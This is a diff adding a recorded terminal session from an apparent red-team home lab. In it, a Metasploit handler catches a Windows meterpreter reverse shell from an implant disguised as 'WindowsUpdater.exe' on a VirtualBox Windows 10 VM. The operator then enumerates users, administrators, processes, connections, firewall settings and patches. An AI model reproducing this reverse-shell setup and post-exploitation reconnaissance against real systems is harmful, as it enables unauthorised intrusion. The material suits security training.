@@ -1,0 +1,536 @@
+Script iniciado em 2026-05-15 08:52:00-03:00 [TERM="xterm-256color" TTY="/dev/pts/0" COLUMNS="80" LINES="24"]
+[?2004h]0;nikolay@debian: ~/lab/Red_Team_Repo/04_Enumeration[01;32mnikolay@debian[00m:[01;34m~/lab/Red_Team_Repo/04_Enumeration[00m$ [7mmsfconsole -q[27mmsfconsole -q
+[?2004l[?1034h[4mmsf[0m [0m> use exploit/multi/handler
+[0m[1m[34m[*][0m Using configured payload generic/shell_reverse_tcp
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> set PAYLOAD windows/x64/meterpreter/reverse_tcp
+[0mPAYLOAD => windows/x64/meterpreter/reverse_tcp
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> set LHOST 192.168.1.143
+[0mLHOST => 192.168.1.143
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> set LPORT 4444
+[0mLPORT => 4444
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> set ExitOnSession false
+[0mExitOnSession => false
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> exploit -j
+[0m[1m[34m[*][0m Exploit running as background job 0.
+[1m[34m[*][0m Exploit completed, but no session was created.
+
+[1m[34m[*][0m Started reverse TCP handler on 192.168.1.143:4444 
+[4mmsf[0m exploit([1m[31mmulti/handler[0m) [0m> [1m[34m[*][0m Sending stage (248902 bytes) to 192.168.1.113
+[0m[0m[1m[34m[*][0m Meterpreter session 1 opened (192.168.1.143:4444 -> 192.168.1.113:49814) at 2026-05-15 09:05:01 -0300
+    sessions -i 1
+[0m[1m[34m[*][0m Starting interaction with 1...
+
+[4mmeterpreter[0m > [H[2J[4mmeterpreter[0m >     sysinfo
+[0mComputer        : WIN10-LAB
+OS              : Windows 10 22H2+ (10.0 Build 19045).
+Architecture    : x64
+System Language : pt_PT
+Domain          : WORKGROUP
+Logged On Users : 2
+Meterpreter     : x64/windows
+[4mmeterpreter[0m > [K[4mmeterpreter[0m > [H[2J[4mmeterpreter[0m >     getuid
+[0mServer username: WIN10-LAB\vboxuser
+[4mmeterpreter[0m > [H[2J[4mmeterpreter[0m >     ipconfig
+[0m
+Interface  1
+============
+Name         : Software Loopback Interface 1
+Hardware MAC : 00:00:00:00:00:00
+MTU          : 4294967295
+IPv4 Address : 127.0.0.1
+IPv4 Netmask : 255.0.0.0
+IPv6 Address : ::1
+IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
+
+
+Interface 13
+============
+Name         : Intel(R) PRO/1000 MT Desktop Adapter
+Hardware MAC : 08:00:27:6b:03:0a
+MTU          : 1500
+IPv4 Address : 192.168.1.113
+IPv4 Netmask : 255.255.255.0
+IPv6 Address : 2804:67a0:2:c9d:a1d7:905d:45a3:327a
+IPv6 Netmask : ffff:ffff:ffff:ffff::
+IPv6 Address : 2804:67a0:2:c9d:2dd2:396b:1087:436b
+IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff
+IPv6 Address : fe80::1fb:1781:3c77:b089
+IPv6 Netmask : ffff:ffff:ffff:ffff::
+
+[4mmeterpreter[0m > [H[2J[4mmeterpreter[0m >     netstat
+[0m
+Connection list
+===============
+
+    Proto  Local address                   Remote address       State        User  Inode  PID/Program name
+    -----  -------------                   --------------       -----        ----  -----  ----------------
+    tcp    0.0.0.0:135                     0.0.0.0:*            LISTEN       0     0      856/svchost.exe
+    tcp    0.0.0.0:445                     0.0.0.0:*            LISTEN       0     0      4/System
+    tcp    0.0.0.0:5040                    0.0.0.0:*            LISTEN       0     0      928/svchost.exe
+    tcp    0.0.0.0:5357                    0.0.0.0:*            LISTEN       0     0      4/System
+    tcp    0.0.0.0:7680                    0.0.0.0:*            LISTEN       0     0      2652/svchost.exe
+    tcp    0.0.0.0:49664                   0.0.0.0:*            LISTEN       0     0      636/lsass.exe
+    tcp    0.0.0.0:49665                   0.0.0.0:*            LISTEN       0     0      476/wininit.exe
+    tcp    0.0.0.0:49666                   0.0.0.0:*            LISTEN       0     0      340/svchost.exe
+    tcp    0.0.0.0:49667                   0.0.0.0:*            LISTEN       0     0      996/svchost.exe
+    tcp    0.0.0.0:49668                   0.0.0.0:*            LISTEN       0     0      1876/spoolsv.exe
+    tcp    0.0.0.0:49670                   0.0.0.0:*            LISTEN       0     0      616/services.exe
+    tcp    192.168.1.113:139               0.0.0.0:*            LISTEN       0     0      4/System
+    tcp    192.168.1.113:49698             172.172.255.216:443  ESTABLISHED  0     0      996/svchost.exe
+    tcp    192.168.1.113:49814             192.168.1.143:4444   ESTABLISHED  0     0      6668/WindowsUpdater.exe
+    tcp    192.168.1.113:49946             199.232.210.172:80   TIME_WAIT    0     0      0/[System Process]
+    tcp    192.168.1.113:50148             150.171.110.39:443   TIME_WAIT    0     0      0/[System Process]
+    tcp    192.168.1.113:50149             20.10.113.82:443     TIME_WAIT    0     0      0/[System Process]
+    tcp    192.168.1.113:50150             20.10.113.82:443     TIME_WAIT    0     0      0/[System Process]
+    tcp    192.168.1.113:50151             20.10.113.82:443     TIME_WAIT    0     0      0/[System Process]
+    tcp    192.168.1.113:50152             20.190.173.70:443    ESTABLISHED  0     0      996/svchost.exe
+    tcp    192.168.1.113:50153             150.171.27.12:443    ESTABLISHED  0     0      5044/SearchApp.exe
+    tcp    192.168.1.113:50154             23.11.35.158:80      ESTABLISHED  0     0      5044/SearchApp.exe
+    tcp    192.168.1.113:50156             23.223.211.191:443   ESTABLISHED  0     0      5044/SearchApp.exe
+    tcp    192.168.1.113:50157             74.163.187.151:443   ESTABLISHED  0     0      7164/smartscreen.exe
+    tcp    192.168.1.113:50159             23.223.211.177:443   ESTABLISHED  0     0      5044/SearchApp.exe
+    tcp    192.168.1.113:50163             23.223.211.177:443   ESTABLISHED  0     0      2644/explorer.exe
+    tcp    192.168.1.113:50164             23.223.211.177:443   ESTABLISHED  0     0      2644/explorer.exe
+    tcp    192.168.1.113:50166             2.18.127.242:443     ESTABLISHED  0     0      5044/SearchApp.exe
+    tcp    192.168.1.113:50168             2.18.127.80:443      ESTABLISHED  0     0      5044/SearchApp.exe
+    tcp    192.168.1.113:50169             2.18.127.74:443      ESTABLISHED  0     0      5044/SearchApp.exe
+    tcp    192.168.1.113:50171             2.18.127.233:443     ESTABLISHED  0     0      5044/SearchApp.exe
+    tcp    192.168.1.113:50178             52.123.244.206:443   TIME_WAIT    0     0      0/[System Process]
+    tcp    192.168.1.113:50183             4.228.132.40:443     ESTABLISHED  0     0      3276/msedgewebview2.exe
+    tcp    192.168.1.113:50184             4.203.73.113:443     TIME_WAIT    0     0      0/[System Process]
+    tcp    192.168.1.113:50185             4.203.73.113:443     ESTABLISHED  0     0      3276/msedgewebview2.exe
+    tcp    192.168.1.113:50187             23.223.211.182:443   ESTABLISHED  0     0      3276/msedgewebview2.exe
+    tcp    192.168.1.113:50189             23.223.211.182:443   CLOSE_WAIT   0     0      3276/msedgewebview2.exe
+    tcp    192.168.1.113:50199             13.227.207.76:443    ESTABLISHED  0     0      3276/msedgewebview2.exe
+    tcp    192.168.1.113:50206             23.223.211.186:443   ESTABLISHED  0     0      3276/msedgewebview2.exe
+    tcp    192.168.1.113:50207             2.18.127.242:443     ESTABLISHED  0     0      3276/msedgewebview2.exe
+    tcp    192.168.1.113:50208             23.223.211.186:443   ESTABLISHED  0     0      3276/msedgewebview2.exe
+    tcp    192.168.1.113:50209             150.171.28.10:443    ESTABLISHED  0     0      3276/msedgewebview2.exe
+    tcp    192.168.1.113:50211             2.18.127.233:443     ESTABLISHED  0     0      3276/msedgewebview2.exe
+    tcp    192.168.1.113:50212             2.18.127.72:443      ESTABLISHED  0     0      3276/msedgewebview2.exe
+    tcp    192.168.1.113:50213             150.171.27.12:443    ESTABLISHED  0     0      3276/msedgewebview2.exe
+    tcp    192.168.1.113:50214             23.223.211.186:443   CLOSE_WAIT   0     0      3276/msedgewebview2.exe
+    tcp    192.168.1.113:50215             204.79.197.203:443   ESTABLISHED  0     0      3276/msedgewebview2.exe
+    tcp    192.168.1.113:50218             2.18.127.75:443      ESTABLISHED  0     0      3276/msedgewebview2.exe
+    tcp    192.168.1.113:50219             2.18.127.75:443      CLOSE_WAIT   0     0      3276/msedgewebview2.exe
+    tcp    192.168.1.113:50221             150.171.110.39:443   TIME_WAIT    0     0      0/[System Process]
+    tcp    192.168.1.113:50222             150.171.110.39:443   TIME_WAIT    0     0      0/[System Process]
+    tcp6   :::135                          :::*                 LISTEN       0     0      856/svchost.exe
+    tcp6   :::445                          :::*                 LISTEN       0     0      4/System
+    tcp6   :::5357                         :::*                 LISTEN       0     0      4/System
+    tcp6   :::7680                         :::*                 LISTEN       0     0      2652/svchost.exe
+    tcp6   :::49664                        :::*                 LISTEN       0     0      636/lsass.exe
+    tcp6   :::49665                        :::*                 LISTEN       0     0      476/wininit.exe
+    tcp6   :::49666                        :::*                 LISTEN       0     0      340/svchost.exe
+    tcp6   :::49667                        :::*                 LISTEN       0     0      996/svchost.exe
+    tcp6   :::49668                        :::*                 LISTEN       0     0      1876/spoolsv.exe
+    tcp6   :::49670                        :::*                 LISTEN       0     0      616/services.exe
+    tcp6   ::1:42050                       :::*                 LISTEN       0     0      6276/OneDrive.Sync.Service.e
+    udp    0.0.0.0:123                     0.0.0.0:*                         0     0      4416/svchost.exe
+    udp    0.0.0.0:3702                    0.0.0.0:*                         0     0      1736/svchost.exe
+    udp    0.0.0.0:3702                    0.0.0.0:*                         0     0      2068/dasHost.exe
+    udp    0.0.0.0:3702                    0.0.0.0:*                         0     0      2068/dasHost.exe
+    udp    0.0.0.0:3702                    0.0.0.0:*                         0     0      1736/svchost.exe
+    udp    0.0.0.0:5050                    0.0.0.0:*                         0     0      928/svchost.exe
+    udp    0.0.0.0:5353                    0.0.0.0:*                         0     0      1176/svchost.exe
+    udp    0.0.0.0:5355                    0.0.0.0:*                         0     0      1176/svchost.exe
+    udp    0.0.0.0:50591                   0.0.0.0:*                         0     0      3276/msedgewebview2.exe
+    udp    0.0.0.0:52043                   0.0.0.0:*                         0     0      3276/msedgewebview2.exe
+    udp    0.0.0.0:52911                   0.0.0.0:*                         0     0      1736/svchost.exe
+    udp    0.0.0.0:52918                   0.0.0.0:*                         0     0      2068/dasHost.exe
+    udp    0.0.0.0:56887                   0.0.0.0:*                         0     0      3276/msedgewebview2.exe
+    udp    0.0.0.0:58736                   0.0.0.0:*                         0     0      3276/msedgewebview2.exe
+    udp    0.0.0.0:62027                   0.0.0.0:*                         0     0      3276/msedgewebview2.exe
+    udp    127.0.0.1:1900                  0.0.0.0:*                         0     0      1736/svchost.exe
+    udp    127.0.0.1:52913                 0.0.0.0:*                         0     0      996/svchost.exe
+    udp    127.0.0.1:52917                 0.0.0.0:*                         0     0      1736/svchost.exe
+    udp    192.168.1.113:137               0.0.0.0:*                         0     0      4/System
+    udp    192.168.1.113:138               0.0.0.0:*                         0     0      4/System
+    udp    192.168.1.113:1900              0.0.0.0:*                         0     0      1736/svchost.exe
+    udp    192.168.1.113:52916             0.0.0.0:*                         0     0      1736/svchost.exe
+    udp6   :::123                          :::*                              0     0      4416/svchost.exe
+    udp6   :::3702                         :::*                              0     0      1736/svchost.exe
+    udp6   :::3702                         :::*                              0     0      2068/dasHost.exe
+    udp6   :::3702                         :::*                              0     0      2068/dasHost.exe
+    udp6   :::3702                         :::*                              0     0      1736/svchost.exe
+    udp6   :::5353                         :::*                              0     0      1176/svchost.exe
+    udp6   :::5355                         :::*                              0     0      1176/svchost.exe
+    udp6   :::52912                        :::*                              0     0      1736/svchost.exe
+    udp6   :::52919                        :::*                              0     0      2068/dasHost.exe
+    udp6   ::1:1900                        :::*                              0     0      1736/svchost.exe
+    udp6   ::1:52915                       :::*                              0     0      1736/svchost.exe
+    udp6   fe80::1fb:1781:3c77:b089:1900   :::*                              0     0      1736/svchost.exe
+    udp6   fe80::1fb:1781:3c77:b089:52914  :::*                              0     0      1736/svchost.exe
+
+[4mmeterpreter[0m > [H[2J[4mmeterpreter[0m > ps
+[0m
+Process List
+============
+
+ PID   PPID  Name                             Arch  Session  User                Path
+ ---   ----  ----                             ----  -------  ----                ----
+ 0     0     [System Process]
+ 4     0     System
+ 92    4     Registry
+ 312   4     smss.exe
+ 332   740   MoUsoCoreWorker.exe
+ 340   616   svchost.exe
+ 356   616   svchost.exe
+ 364   740   UserOOBEBroker.exe               x64   1        WIN10-LAB\vboxuser  C:\Windows\System32\oobe\UserOOBEBroker.exe
+ 404   396   csrss.exe
+ 476   396   wininit.exe
+ 484   468   csrss.exe
+ 564   468   winlogon.exe
+ 616   476   services.exe
+ 636   476   lsass.exe
+ 692   4684  conhost.exe
+ 740   616   svchost.exe
+ 764   564   fontdrvhost.exe
+ 776   476   fontdrvhost.exe
+ 856   616   svchost.exe
+ 924   356   ctfmon.exe                       x64   1
+ 928   616   svchost.exe
+ 944   616   msiexec.exe
+ 964   564   dwm.exe
+ 996   616   svchost.exe
+ 1124  616   svchost.exe
+ 1176  616   svchost.exe
+ 1260  4     Memory Compression
+ 1460  616   svchost.exe
+ 1604  616   svchost.exe
+ 1616  616   svchost.exe
+ 1648  616   svchost.exe
+ 1680  616   svchost.exe
+ 1736  616   svchost.exe
+ 1876  616   spoolsv.exe
+ 1916  740   SearchApp.exe                    x64   1        WIN10-LAB\vboxuser  C:\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\SearchApp.exe
+ 1936  616   svchost.exe
+ 2068  356   dasHost.exe
+ 2088  740   RuntimeBroker.exe                x64   1        WIN10-LAB\vboxuser  C:\Windows\System32\RuntimeBroker.exe
+ 2108  616   svchost.exe
+ 2208  740   RuntimeBroker.exe                x64   1        WIN10-LAB\vboxuser  C:\Windows\System32\RuntimeBroker.exe
+ 2304  616   svchost.exe
+ 2320  740   WmiPrvSE.exe
+ 2400  616   sppsvc.exe
+ 2428  740   SystemSettings.exe               x64   1        WIN10-LAB\vboxuser  C:\Windows\ImmersiveControlPanel\SystemSettings.exe
+ 2464  740   TextInputHost.exe                x64   1        WIN10-LAB\vboxuser  C:\Windows\SystemApps\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\TextInputHost.exe
+ 2512  740   RuntimeBroker.exe                x64   1        WIN10-LAB\vboxuser  C:\Windows\System32\RuntimeBroker.exe
+ 2592  332   wuauclt.exe
+ 2644  3368  explorer.exe                     x64   1        WIN10-LAB\vboxuser  C:\Windows\explorer.exe
+ 2648  616   svchost.exe
+ 2652  616   svchost.exe
+ 2712  996   taskhostw.exe                    x64   1        WIN10-LAB\vboxuser  C:\Windows\System32\taskhostw.exe
+ 2724  6176  MusNotifyIcon.exe                x64   1        WIN10-LAB\vboxuser  C:\Windows\System32\MusNotifyIcon.exe
+ 2744  616   svchost.exe
+ 2756  996   taskhostw.exe
+ 2864  616   svchost.exe                      x64   1        WIN10-LAB\vboxuser  C:\Windows\System32\svchost.exe
+ 2876  4428  msedgewebview2.exe               x64   1        WIN10-LAB\vboxuser  C:\Program Files (x86)\Microsoft\EdgeWebView\Application\148.0.3967.54\msedgewebview2.exe
+ 2912  616   svchost.exe
+ 2980  616   SearchIndexer.exe
+ 3276  5908  msedgewebview2.exe               x64   1        WIN10-LAB\vboxuser  C:\Program Files (x86)\Microsoft\EdgeWebView\Application\148.0.3967.54\msedgewebview2.exe
+ 3332  616   TrustedInstaller.exe
+ 3500  2592  Windows-KB890830-x64-V5.141.exe
+ 3536  5908  msedgewebview2.exe               x64   1        WIN10-LAB\vboxuser  C:\Program Files (x86)\Microsoft\EdgeWebView\Application\148.0.3967.54\msedgewebview2.exe
+ 3608  616   svchost.exe
+ 3812  3956  M365Copilot.exe                  x64   1        WIN10-LAB\vboxuser  C:\Program Files\WindowsApps\Microsoft.MicrosoftOfficeHub_19.2605.41181.0_x64__8wekyb3d8bbwe\M365Copilot.ex
+                                                                                 e
+ 3816  5908  msedgewebview2.exe               x64   1        WIN10-LAB\vboxuser  C:\Program Files (x86)\Microsoft\EdgeWebView\Application\148.0.3967.54\msedgewebview2.exe
+ 3956  996   sihost.exe                       x64   1        WIN10-LAB\vboxuser  C:\Windows\System32\sihost.exe
+ 4160  5588  conhost.exe
+ 4228  740   dllhost.exe                      x64   1        WIN10-LAB\vboxuser  C:\Windows\System32\dllhost.exe
+ 4236  6196  ngen.exe
+ 4296  7456  conhost.exe
+ 4352  4428  msedgewebview2.exe               x64   1        WIN10-LAB\vboxuser  C:\Program Files (x86)\Microsoft\EdgeWebView\Application\148.0.3967.54\msedgewebview2.exe
+ 4416  616   svchost.exe
+ 4428  3812  msedgewebview2.exe               x64   1        WIN10-LAB\vboxuser  C:\Program Files (x86)\Microsoft\EdgeWebView\Application\148.0.3967.54\msedgewebview2.exe
+ 4520  4428  msedgewebview2.exe               x64   1        WIN10-LAB\vboxuser  C:\Program Files (x86)\Microsoft\EdgeWebView\Application\148.0.3967.54\msedgewebview2.exe
+ 4532  740   StartMenuExperienceHost.exe      x64   1        WIN10-LAB\vboxuser  C:\Windows\SystemApps\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\StartMenuExperienceHost.exe
+ 4540  740   backgroundTaskHost.exe           x64   1        WIN10-LAB\vboxuser  C:\Windows\System32\backgroundTaskHost.exe
+ 4668  3500  MRT.exe
+ 4684  356   Defrag.exe
+ 4692  740   RuntimeBroker.exe                x64   1        WIN10-LAB\vboxuser  C:\Windows\System32\RuntimeBroker.exe
+ 4748  616   svchost.exe
+ 4984  2644  SecurityHealthSystray.exe        x64   1        WIN10-LAB\vboxuser  C:\Windows\System32\SecurityHealthSystray.exe
+ 5024  2644  OneDrive.exe                     x64   1        WIN10-LAB\vboxuser  C:\Users\vboxuser\AppData\Local\Microsoft\OneDrive\OneDrive.exe
+ 5044  740   SearchApp.exe                    x64   1        WIN10-LAB\vboxuser  C:\Windows\SystemApps\Microsoft.Windows.Search_cw5n1h2txyewy\SearchApp.exe
+ 5104  616   svchost.exe                      x64   1        WIN10-LAB\vboxuser  C:\Windows\System32\svchost.exe
+ 5152  740   ApplicationFrameHost.exe         x64   1        WIN10-LAB\vboxuser  C:\Windows\System32\ApplicationFrameHost.exe
+ 5464  4428  msedgewebview2.exe               x64   1        WIN10-LAB\vboxuser  C:\Program Files (x86)\Microsoft\EdgeWebView\Application\148.0.3967.54\msedgewebview2.exe
+ 5588  2756  ngentask.exe
+ 5672  5908  msedgewebview2.exe               x64   1        WIN10-LAB\vboxuser  C:\Program Files (x86)\Microsoft\EdgeWebView\Application\148.0.3967.54\msedgewebview2.exe
+ 5784  616   SecurityHealthService.exe
+ 5808  740   RuntimeBroker.exe                x64   1        WIN10-LAB\vboxuser  C:\Windows\System32\RuntimeBroker.exe
+ 5876  4428  msedgewebview2.exe               x64   1        WIN10-LAB\vboxuser  C:\Program Files (x86)\Microsoft\EdgeWebView\Application\148.0.3967.54\msedgewebview2.exe
+ 5908  5044  msedgewebview2.exe               x64   1        WIN10-LAB\vboxuser  C:\Program Files (x86)\Microsoft\EdgeWebView\Application\148.0.3967.54\msedgewebview2.exe
+ 5916  740   WmiPrvSE.exe
+ 5928  740   TiWorker.exe
+ 6188  6824  mscorsvw.exe
+ 6196  2756  ngentask.exe
+ 6204  5908  msedgewebview2.exe               x64   1        WIN10-LAB\vboxuser  C:\Program Files (x86)\Microsoft\EdgeWebView\Application\148.0.3967.54\msedgewebview2.exe
+ 6276  5024  OneDrive.Sync.Service.exe        x64   1        WIN10-LAB\vboxuser  C:\Users\vboxuser\AppData\Local\Microsoft\OneDrive\26.070.0414.0001\OneDrive.Sync.Service.exe
+ 6596  996   provtool.exe
+ 6668  2644  WindowsUpdater.exe               x64   1        WIN10-LAB\vboxuser  C:\Users\vboxuser\AppData\Roaming\WindowsUpdater.exe
+ 6732  740   ShellExperienceHost.exe          x64   1        WIN10-LAB\vboxuser  C:\Windows\SystemApps\ShellExperienceHost_cw5n1h2txyewy\ShellExperienceHost.exe
+ 6824  5588  ngen.exe
+ 7164  740   smartscreen.exe                  x64   1        WIN10-LAB\vboxuser  C:\Windows\System32\smartscreen.exe
+ 7456  356   CompatTelRunner.exe
+ 7600  740   RuntimeBroker.exe                x64   1        WIN10-LAB\vboxuser  C:\Windows\System32\RuntimeBroker.exe
+ 8052  740   RuntimeBroker.exe                x64   1        WIN10-LAB\vboxuser  C:\Windows\System32\RuntimeBroker.exe
+ 8180  6196  conhost.exe
+
+[4mmeterpreter[0m > [H[2J[4mmeterpreter[0m > shell
+[0mProcess 7508 created.
+Channel 1 created.
+Microsoft Windows [vers∆o 10.0.19045.6456]
+(c) Microsoft Corporation. Todos os direitos reservados.
+
+C:\Windows\system32>net user
+net user
+
+Contas de usu†rio para \\WIN10-LAB
+
+-------------------------------------------------------------------------------
+Administrador            Convidado                DefaultAccount           
+Financeiro_Maria         Suporte_TI               vboxuser                 
+WDAGUtilityAccount       
+Comando conclu°do com àxito.
+
+
+C:\Windows\system32>net localgroup administrators
+net localgroup administrators
+Erro de sistema 1376.
+
+O grupo local especificado n∆o existe.
+
+
+C:\Windows\system32>exit
+exit
+[4mmeterpreter[0m > [H[2J[4mmeterpreter[0m > run checkvm
+[0m[1m[33m[!][0m Meterpreter scripts are deprecated. Try post/windows/gather/checkvm.
+[1m[33m[!][0m Example: run post/windows/gather/checkvm OPTION=value [...]
+[1m[31m[-][0m The specified meterpreter session script could not be found: checkvm
+[4mmeterpreter[0m > [H[2J[4mmeterpreter[0m > shell
+[0mProcess 6148 created.
+Channel 2 created.
+Microsoft Windows [vers∆o 10.0.19045.6456]
+(c) Microsoft Corporation. Todos os direitos reservados.
+
+C:\Windows\system32>netsh advfirewall show allprofiles
+netsh advfirewall show allprofiles
+
+Perfil do Dom°nio Configuraá‰es: 
+----------------------------------------------------------------------
+Estado                                Desligado
+Pol°tica de Firewall                  BlockInbound,AllowOutbound
+LocalFirewallRules                    N/D (apenas reposit¢rio GPO)
+LocalConSecRules                      N/D (apenas reposit¢rio GPO)
+InboundUserNotification               Habilitar
+RemoteManagement                      Desabilitar
+UnicastResponseToMulticast            Habilitar
+
+Registrando em log:
+LogAllowedConnections                 Desabilitar
+LogDroppedConnections                 Desabilitar
+FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
+MaxFileSize                           4096
+
+
+Perfil Particular Configuraá‰es: 
+----------------------------------------------------------------------
+Estado                                Ligado
+Pol°tica de Firewall                  BlockInbound,AllowOutbound
+LocalFirewallRules                    N/D (apenas reposit¢rio GPO)
+LocalConSecRules                      N/D (apenas reposit¢rio GPO)
+InboundUserNotification               Habilitar
+RemoteManagement                      Desabilitar
+UnicastResponseToMulticast            Habilitar
+
+Registrando em log:
+LogAllowedConnections                 Desabilitar
+LogDroppedConnections                 Desabilitar
+FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
+MaxFileSize                           4096
+
+
+Perfil P£blico Configuraá‰es: 
+----------------------------------------------------------------------
+Estado                                Ligado
+Pol°tica de Firewall                  BlockInbound,AllowOutbound
+LocalFirewallRules                    N/D (apenas reposit¢rio GPO)
+LocalConSecRules                      N/D (apenas reposit¢rio GPO)
+InboundUserNotification               Habilitar
+RemoteManagement                      Desabilitar
+UnicastResponseToMulticast            Habilitar
+
+Registrando em log:
+LogAllowedConnections                 Desabilitar
+LogDroppedConnections                 Desabilitar
+FileName                              %systemroot%\system32\LogFiles\Firewall\pfirewall.log
+MaxFileSize                           4096
+
+Ok.
+
+
+C:\Windows\system32>^L  exit
+exit
+[4mmeterpreter[0m > [H[2J[4mmeterpreter[0m > shell
+[0mProcess 6548 created.
+Channel 3 created.
+Microsoft Windows [vers∆o 10.0.19045.6456]
+(c) Microsoft Corporation. Todos os direitos reservados.
+
+C:\Windows\system32>systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"Hotfix(s)"
+systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"Hotfix(s)"
+
+C:\Windows\system32>run post/windows/gather/checkvm
+run post/windows/gather/checkvm
+'run' n∆o Ç reconhecido como um comando interno
+ou externo, um programa oper†vel ou um arquivo em lotes.
+
+C:\Windows\system32>^L  cls
+cls
+
+C:\Windows\system32>clear
+clear
+'clear' n∆o Ç reconhecido como um comando interno
+ou externo, um programa oper†vel ou um arquivo em lotes.
+
+C:\Windows\system32>^L  exit
+exit
+[4mmeterpreter[0m > [H[2J[4mmeterpreter[0m > shell
+[0mProcess 4448 created.
+Channel 4 created.
+Microsoft Windows [vers∆o 10.0.19045.6456]
+(c) Microsoft Corporation. Todos os direitos reservados.
+
+C:\Windows\system32>C:\Windows\system32> net localgroup Administradores
+C:\Windows\system32> net localgroup Administradores
+Acesso negado.
+
+C:\Windows\system32>net localgroup Administradores
+net localgroup Administradores
+Nome de alias      Administradores
+Coment†rio         Os administradores tàm acesso completo e irrestrito ao computador/dom°nio
+
+Membros
+
+-------------------------------------------------------------------------------
+Administrador
+Suporte_TI
+vboxuser
+Comando conclu°do com àxito.
+
+
+C:\Windows\system32>run post/windows/gather/checkvm
+run post/windows/gather/checkvm
+'run' n∆o Ç reconhecido como um comando interno
+ou externo, um programa oper†vel ou um arquivo em lotes.
+
+C:\Windows\system32>exit
+exit
+[4mmeterpreter[0m > [H[2J[4mmeterpreter[0m > shell
+[0mProcess 7984 created.
+Channel 5 created.
+Microsoft Windows [vers∆o 10.0.19045.6456]
+(c) Microsoft Corporation. Todos os direitos reservados.
+
+C:\Windows\system32>arp
+arp
+
+Exibe e modifica as tabelas de convers∆o de endereáos IP para endereáos
+f°sicos usadas pelo protocolo de resoluá∆o de endereáos (ARP).
+
+ARP -s inet_addr eth_addr [if_addr]
+ARP -d inet_addr [if_addr]
+ARP -a [inet_addr] [-N if_addr] [-v]
+
+  -a            Exibe entradas ARP atuais interrogando os dados
+                de protocolo atuais. Se inet_addr for especificado, somente
+                os endereáos IP e f°sicos do computador especificado ser∆o
+                exibidos. Se mais de uma interface de rede usar ARP, ser∆o
+                exibidas as entradas para cada tabela ARP.
+  -g            O mesmo que -a.
+  -v            Exibe as entradas ARP atuais no modo detalhado. Todas as
+                entradas inv†lidas e entradas na interface de loopback
+                ser∆o mostradas.
+  inet_addr     Especifica um endereáo Internet.
+  -N if_addr    Exibe as entradas ARP para cada interface de rede especificada
+                por if_addr.
+  -d            Exclui o host especificado por inet_addr. O inet_addr pode ser
+                marcado com o caractere * para exclus∆o de todos os hosts.
+  -s            Adiciona o host e associa o endereáo Internet inet_addr
+                ao Endereáo f°sico eth_addr. O Endereáo f°sico Ç passado como
+                6 bytes hexadecimais separados por h°fens. A entrada Ç
+                permanente.
+  eth_addr      Especifica um endereáo f°sico.
+  if_addr       Caso esteja presente, especifica o endereáo Internet da
+                interface cuja tabela de convers∆o de endereáos deve ser
+                modificada.
+                Caso contr†rio, Ç usada a primeira interface aplic†vel.
+Exemplo:
+  > arp -s 157.55.85.212   00-aa-00-62-c6-09  .... Adiciona uma entrada
+                                                   est†tica.
+  > arp -a                                    .... Exibe a tabela ARP.
+
+C:\Windows\system32>exit
+exit
+[4mmeterpreter[0m > [H[2J[4mmeterpreter[0m > arp
+[0m
+ARP cache
+=========
+
+    IP address       MAC address        Interface
+    ----------       -----------        ---------
+    192.168.1.1      1c:5f:2b:ff:8b:1c  Intel(R) PRO/1000 MT Desktop Adapter
+    192.168.1.143    08:00:27:a7:25:9f  Intel(R) PRO/1000 MT Desktop Adapter
+    192.168.1.255    ff:ff:ff:ff:ff:ff  Intel(R) PRO/1000 MT Desktop Adapter
+    224.0.0.22       00:00:00:00:00:00  Software Loopback Interface 1
+    224.0.0.22       01:00:5e:00:00:16  Intel(R) PRO/1000 MT Desktop Adapter
+    224.0.0.251      01:00:5e:00:00:fb  Intel(R) PRO/1000 MT Desktop Adapter
+    224.0.0.252      01:00:5e:00:00:fc  Intel(R) PRO/1000 MT Desktop Adapter
+    239.255.255.250  00:00:00:00:00:00  Software Loopback Interface 1
+    239.255.255.250  01:00:5e:7f:ff:fa  Intel(R) PRO/1000 MT Desktop Adapter
+    255.255.255.255  ff:ff:ff:ff:ff:ff  Intel(R) PRO/1000 MT Desktop Adapter
+
+[4mmeterpreter[0m > [H[2J[4mmeterpreter[0m > shek[Kll
+[0mProcess 2828 created.
+Channel 6 created.
+Microsoft Windows [vers∆o 10.0.19045.6456]
+(c) Microsoft Corporation. Todos os direitos reservados.
+
+C:\Windows\system32>wmic service get name,displayname,pathname,startmode | findstr /i "Running"
+wmic service get name,displayname,pathname,startmode | findstr /i "Running"
+
+C:\Windows\system32>wmic qfe get Caption,Description,HotFixID,InstalledOn
+wmic qfe get Caption,Description,HotFixID,InstalledOn
+Caption                                     Description      HotFixID   InstalledOn  
+http://support.microsoft.com/?kbid=5066130  Update           KB5066130               
+http://support.microsoft.com/?kbid=5022502  Update           KB5022502  5/5/2023     
+http://support.microsoft.com/?kbid=5011048  Update           KB5011048  5/12/2026    
+http://support.microsoft.com/?kbid=5011067  Update           KB5011067               
+https://support.microsoft.com/help/5015684  Update           KB5015684  5/5/2023     
+https://support.microsoft.com/help/5033052  Update           KB5033052  5/15/2026    
+https://support.microsoft.com/help/5072653  Security Update  KB5072653               
+https://support.microsoft.com/help/5066791  Security Update  KB5066791  5/15/2026    
+                                            Security Update  KB5014032  5/5/2023     
+                                            Update           KB5025315  5/5/2023     
+                                            Security Update  KB5066790  5/15/2026    
+
+
+C:\Windows\system32>cls
+cls
+
+C:\Windows\system32>^L
+
+C:\Windows\system32>exit
+exit
+[4mmeterpreter[0m > [H[2J[4mmeterpreter[0m > exit
+[0m[1m[34m[*][0m Shutting down session: 1
+
+[1m[34m[*][0m 192.168.1.113 - Meterpreter session 1 closed.  Reason: Died
